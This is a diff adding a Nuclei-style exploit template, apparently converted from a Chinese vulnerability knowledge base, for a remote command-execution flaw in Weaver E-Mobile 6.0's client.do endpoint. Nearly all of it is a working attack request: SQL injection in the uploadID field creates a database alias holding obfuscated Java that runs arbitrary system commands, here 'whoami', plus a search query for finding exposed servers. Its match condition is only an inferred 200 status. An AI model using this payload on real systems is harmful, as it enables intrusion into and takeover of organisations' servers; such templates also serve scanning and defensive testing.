@@ -1,0 +1,84 @@
+id: poc-aa3295bc2f5557bf6479
+info:
+  name: 泛微E-Mobile6.0client.do存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aa3295bc2f5557bf64794a4345ab7e8c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aa3295bc2f5557bf64794a4345ab7e8c
+    fofa: + hunter：`app.name=="泛微 e-mobile OA"`
+http:
+- raw:
+  - 'POST /client.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: JSESSIONID=abcZRb929ZuHEdfjFEAMy
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
+
+    Content-Length: 1151
+
+
+    ------WebKitFormBoundaryTm8YXcJeyKDClbU7
+
+    Content-Disposition: form-data; name="method"
+
+
+    getupload
+
+    ------WebKitFormBoundaryTm8YXcJeyKDClbU7
+
+    Content-Disposition: form-data; name="uploadID"
+
+
+    1'';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT(''void e(String cmd) throws
+
+    java.la'',''ng.Exception{'',''Object curren'',''tRequest =
+
+    Thre'',''ad.currentT'',''hread().getConte'',''xtClass'',''Loader().loadC'',''lass("com.caucho.ser
+
+    ver.dispatch.ServletInvocation").getMet'',''hod("getContextRequest").inv'',''oke(null);java
+
+    .la'',''ng.reflect.Field _responseF =
+
+    currentRequest.getCl'',''ass().getSuperc'',''lass().getDeclar'',''edField("_response");_respo
+
+    nseF.setAcce'',''ssible(true);Object response =
+
+    _responseF.get(currentRequest);java.la'',''ng.reflect.Method getWriterM =
+
+    response.getCl'',''ass().getMethod("getWriter");java.i'',''o.Writer writer =
+
+    (java.i'',''o.Writer)getWriterM.inv'',''oke(response);java.ut'',''il.Scan'',''ner scan'',''ner =
+
+    (new
+
+    java.util.Scann'',''er(Runt'',''ime.getRunt'',''ime().ex'',''ec(cmd).getInput'',''Stream())).useD
+
+    elimiter("\\A");writer.write(scan'',''ner.hasNext()?sca'',''nner.next():"");}'');CALL
+
+    MzSNqKsZTagmf(''whoami'');--
+
+    ------WebKitFormBoundaryTm8YXcJeyKDClbU7--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
